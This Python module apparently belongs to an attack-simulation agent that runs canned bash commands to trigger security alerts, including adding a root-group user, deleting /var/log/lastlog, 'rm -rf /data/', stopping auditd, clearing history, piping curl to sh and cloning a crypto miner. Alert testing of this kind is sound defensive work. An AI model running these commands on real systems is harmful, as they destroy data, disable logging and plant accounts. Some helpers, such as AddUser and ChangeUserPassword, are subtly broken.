#!/usr/bin/python3
import os
from AaSystem.LogAndPrint.Log import PrintAndLog, PrintRedAndLog
from AaSystem.OperatingSystem.SystemInspector import GetOperatingSystemName
from Agent.AttackAgent.BashCommands.BashCommandExecutor import RunSubProcess


def PerformCustomCommand(request):
    if not request:
        PrintRedAndLog("Missing bash command")
    if "-help" in request:
        Help_PerformCustomCommand(request)
        return

    return RunSubProcess(request[0])


def IpConfig(request):
    if "-help" in request:
        Help_IpConfig(request)
        return

    if str.lower(GetOperatingSystemName()) == "linux":
        return RunSubProcess("ifconfig -a")
    return RunSubProcess("ipconfig")


def AddSuspiciousUser(request):
    if "-help" in request:
        Help_AddSuspiciousUser(request)
        return

    return RunSubProcess("sudo useradd aaa -g 0")


def SuspiciousNohup(request):
    if "-help" in request:
        Help_SuspiciousNohup(request)
        return

    return RunSubProcess("nohup cat /tmp/")


def ReverseShell(request):
    if "-help" in request:
        Help_ReverseShell(request)
        return

    return RunSubProcess("python import socket /bin/sh")


def RemovelOfSystemLogs(request):
    if "-help" in request:
        Help_RemovelOfSystemLogs(request)
        return

    return RunSubProcess("rm /var/log/lastlog")


def Ransomware(request):
    if "-help" in request:
        Help_Ransomware(request)
        return

    return RunSubProcess("touch test.GNNCRY")


def PrivilegedContainer(request):
    if "-help" in request:
        Help_PrivilegedContainer(request)
        return

    return RunSubProcess("docker run redis --privileged")


def PossibleMalware(request):
    if "-help" in request:
        Help_PossibleMalware(request)
        return

    return RunSubProcess(" curl pastebin.com")


def OverrideLinuxFiles(request):
    if "-help" in request:
        Help_OverrideLinuxFiles(request)
        return

    return RunSubProcess("cp /bin/netstat a")


def LinuxReconnaissance(request):
    if "-help" in request:
        Help_LinuxReconnaissance(request)
        return

    return RunSubProcess("uname -n -s -r -v")


def LinuxBackdoor(request):
    if "-help" in request:
        Help_LinuxBackdoor(request)
        return

    return RunSubProcess("touch d-bus notifier")


def FairwareMalware(request):
    if "-help" in request:
        Help_FairwareMalware(request)
        return

    return RunSubProcess("rm -rf /data/")


def EgressData(request):
    if "-help" in request:
        Help_EgressData(request)
        return

    return RunSubProcess("bash /dev/tcp/")


def DownloadFileThenRun(request):
    if "-help" in request:
        Help_DownloadFileThenRun(request)
        return

    return RunSubProcess("curl google.com | sh")


def DisableFirewall(request):
    if "-help" in request:
        Help_DisableFirewall(request)
        return

    return RunSubProcess("touch f0VMRgIBAQ")


def DisableAuditdLogging(request):
    if "-help" in request:
        Help_DisableAuditdLogging(request)
        return

    return RunSubProcess("sudo service auditd stop")


def CryptoMiner(request):
    if "-help" in request:
        Help_CryptoMiner(request)
        return

    return RunSubProcess("git clone https://github.com/cpuminer")


def CommonBots(request):
    if "-help" in request:
        Help_CommonBots(request)
        return

    return RunSubProcess("touch RTEGFN01.dat")


def ClearHistoryFile(request):
    if "-help" in request:
        Help_ClearHistoryFile(request)
        return

    return RunSubProcess("history -c")


def DownloadVirusFile(request):
    if "-help" in request:
        Help_DownloadVirusFile(request)
        return

    return RunSubProcess("sudo mkdir -p ~/AriotsTemp/virus;sudo wget -O ~/AriotsTemp/virus/virus.txt "
                         "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt")


def DownloadFile(request):
    if "-help" in request:
        Help_DownloadFile(request)
        return

    if not request:
        PrintRedAndLog("Missing required parameter: download url")
    url = request[0]
    return RunSubProcess(f"sudo mkdir -p ~/AriotsTemp;sudo wget -O ~/AriotsTemp/{os.path.basename(url)} {url}")


def WhoAmI(request):
    if "-help" in request:
        Help_WhoAmI(request)
        return

    if request and request[0] == "-r":
        return RunSubProcess("sudo whoami")
    return RunSubProcess("whoami")


def Ping(request):
    if "-help" in request:
        Help_Ping(request)
        return

    if not request:
        PrintRedAndLog("Missing required parameters")
    requestPing = request[0]
    if requestPing == "google":
        return RunSubProcess("ping -c 4 google.com")
    if requestPing == "self":
        return RunSubProcess("ping -c 4 127.0.0.1")
    if requestPing == "8":
        return RunSubProcess("ping -c 4 8.8.8.8")
    if requestPing == "-c" and len(request) > 1:
        return RunSubProcess(f"ping -c 4 {request[1]}")
    PrintRedAndLog("Invalid or missing parameters")


def AddUser(request):
    if "-help" in request:
        Help_AddUser(request)
        return

    if not request or len(request) < 2:
        PrintRedAndLog("Missing required parameters")
        return
    userType = request[0]
    if userType == "-r":
        return RunSubProcess(f"useradd {request[0]}")
    if userType == "-a":
        return RunSubProcess(f"useradd {request[0]} sudo")
    PrintRedAndLog("Invalid parameter passed")
    return


def ChangeUserPassword(request):
    if "-help" in request:
        Help_ChangeUserPassword(request)
        return

    if not request or len(request) < 2:
        PrintRedAndLog("Missing required parameters")
    newPassword = request[0]
    user = request[1]
    return RunSubProcess(f"sudo {newPassword} {user}")


def KillProcess(request):
    if "-help" in request:
        Help_KillProcess(request)
        return

    if not request or len(request) < 2:
        PrintRedAndLog("Missing required parameters")
    killType = request[0]
    killName = request[1]
    if killType == "-p":
        return RunSubProcess(f"sudo kill -9 $(lsof -t -i:{killName})")
    if killType == "-n":
        return RunSubProcess(f"sudo killall -9 {killName}")
    if killType == "-s":
        return RunSubProcess(f"sudo pkill -9 {killName}")
    if killType == "-i":
        return RunSubProcess(f"sudo kill -9 {killName}")
    return PrintRedAndLog(f"Invalid parameter killType: {killType} passed")


def Help_PerformCustomCommand(request):
    return PrintAndLog("\n"
                       "       Performs a custom bash command passed as the parameter")


def Help_IpConfig(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'ipconfig'\n"
                       "       Meant as a simple code functionality and sanity test")


def Help_AddSuspiciousUser(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'sudo useradd aaa -g 0'\n"
                       "       Triggers alert: 'AddSuspiciousUser'")


def Help_SuspiciousNohup(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'nohup cat /tmp/'\n"
                       "       Triggers alert: 'SuspiciousNohup'")


def Help_ReverseShell(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'python import socket /bin/sh'\n"
                       "       Triggers alert: 'ReverseShell'")


def Help_RemovelOfSystemLogs(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'rm /var/log/lastlog'\n"
                       "       Triggers alert: 'RemovelOfSystemLogs'")


def Help_Ransomware(request):
    return PrintAndLog("\n"
                       "Performs the bash command: 'touch test.GNNCRY'\n"
                       "Triggers alert: 'Ransomware'")


def Help_PrivilegedContainer(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'docker run redis --privileged'\n"
                       "       Triggers alert: 'PrivilegedContainer'")


def Help_PossibleMalware(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'curl pastebin.com'\n"
                       "       Triggers alert: 'PossibleMalware'")


def Help_OverrideLinuxFiles(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'cp /bin/netstat a'\n"
                       "       Triggers alert: 'OverrideLinuxFiles'")


def Help_LinuxReconnaissance(request):
    return PrintAndLog("       Performs the bash command: 'uname -n -s -r -v'\n"
                       "       Triggers alert: 'LinuxReconnaissance'")


def Help_LinuxBackdoor(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'touch d-bus notifier'\n"
                       "       Triggers alert: 'LinuxBackdoor'")


def Help_FairwareMalware(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'rm -rf /data/'\n"
                       "       Triggers alert: 'FairwareMalware'")


def Help_EgressData(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'bash /dev/tcp/'\n"
                       "       Triggers alert: 'EgressData'")


def Help_DownloadFileThenRun(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'curl google.com | sh'\n"
                       "       Triggers alert: 'DownloadFileThenRun'")


def Help_DisableFirewall(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'touch f0VMRgIBAQ'\n"
                       "       Triggers alert: 'DisableFirewall'")


def Help_DisableAuditdLogging(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'sudo service auditd stop'\n"
                       "       Triggers alert: 'DisableAuditdLogging'")


def Help_CryptoMiner(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'git clone https://github.com/cpuminer'\n"
                       "       Triggers alert: 'CryptoMiner'")


def Help_CommonBots(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'touch RTEGFN01.dat'\n"
                       "       Triggers alert: 'CommonBots'")


def Help_ClearHistoryFile(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'history -c'\n"
                       "       Triggers alert: 'ClearHistoryFile'")


def Help_DownloadVirusFile(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'wget /home "
                       "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt'\n"
                       "       Downloads a 'suspicious file from the internet")


def Help_DownloadFile(request):
    return PrintAndLog("\n"
                       "       Receives one parameter [URL] and performs a wget request from that url\n"
                       "       Performs the bash command: 'wget ~/AriotsTemp/ [requestUrl]'")


def Help_WhoAmI(request):
    return PrintAndLog("\n"
                       "       Runs the self discovering command 'whoami'\n"
                       "       The parameter -r can be passed at the end to indicate to run as root (sudo)")


def Help_Ping(request):
    return PrintAndLog("\n"
                       "       pings a destination url'\n"
                       "       Receives one of the following parameters:\n"
                       "                     'google' - pings google.com\n"
                       "                     'self' - pings 127.0.0.1\n"
                       "                     '8' - pings 8.8.8.8\n"
                       "                     '-c' - in this case the request takes in an additional parameter [url] and"
                       " pings that url - ping [url]\n"
                       "       The destination is pinged 4 times, the response will appear once all four pings have "
                       "completed")


def Help_AddUser(request):
    return PrintAndLog("\n"
                       "       dds a user to the operating system.\n"
                       "       useradd [Type] [Username]\n"
                       "                     'Type' - indicated the type of user that will be created, currently"
                       " supporting:\n"
                       "                     '-r' - regular user\n"
                       "                     '-a' - admin user\n"
                       "                     'Username' - a string that is the username that will be created")


def Help_ChangeUserPassword(request):
    return PrintAndLog("\n"
                       "Changes the password for a user\n"
                       "       changeuserpassword [NewPassword] [User]\n"
                       "                     'NewPassword' - the new password that will be set for user\n"
                       "                     'User' - the username of the user")


def Help_KillProcess(request):
    return PrintAndLog("\n"
                       "       Kills an active process\n"
                       "       killprocess [KillType] [KillName]\n"
                       "                     'KillType' - the type of parameter that will be passed in the KillName, "
                       "currently supporting:\n"
                       "                     '-p' - KillName is a port and the process on that port will be "
                       "terminated\n"
                       "                     '-n' - KillName is an exact process name and that process will be "
                       "terminated\n"
                       "                     '-s' - KillName is a partial name and all processes containing KillName"
                       " will be terminated\n"
                       "                     '-i' - KillName is a PID (Process ID) and a process with that PID "
                       "will be terminated\n"
                       "                     'KillName' - The name of the parameter that will be killed according "
                       "the KillType")


PerformCustomCommand.PublicFacing = "custombash"
IpConfig.PublicFacing = "getip"
AddSuspiciousUser.PublicFacing = "addsuspicioususer"
SuspiciousNohup.PublicFacing = "suspiciousnohup"
ReverseShell.PublicFacing = "reverseshell"
RemovelOfSystemLogs.PublicFacing = "removelofsystemlogs"
Ransomware.PublicFacing = "ransomware"
PrivilegedContainer.PublicFacing = "privilegedcontainer"
PossibleMalware.PublicFacing = "possiblemalware"
OverrideLinuxFiles.PublicFacing = "overridelinuxfiles"
LinuxReconnaissance.PublicFacing = "linuxreconnaissance"
LinuxBackdoor.PublicFacing = "linuxbackdoor"
FairwareMalware.PublicFacing = "fairwaremalware"
EgressData.PublicFacing = "egressdata"
DownloadFileThenRun.PublicFacing = "downloadfilethenrun"
DisableFirewall.PublicFacing = "disablefirewall"
DisableAuditdLogging.PublicFacing = "disableauditdlogg"
CryptoMiner.PublicFacing = "cryptominer"
CommonBots.PublicFacing = "commonbots"
ClearHistoryFile.PublicFacing = "clearhistoryfile"
DownloadVirusFile.PublicFacing = "downloadvirusfile"
DownloadFile.PublicFacing = "downloadfile"
WhoAmI.PublicFacing = "whoami"
Ping.PublicFacing = "ping"
AddUser.PublicFacing = "adduser"
ChangeUserPassword.PublicFacing = "changeuserpassword"
KillProcess.PublicFacing = "killprocess"
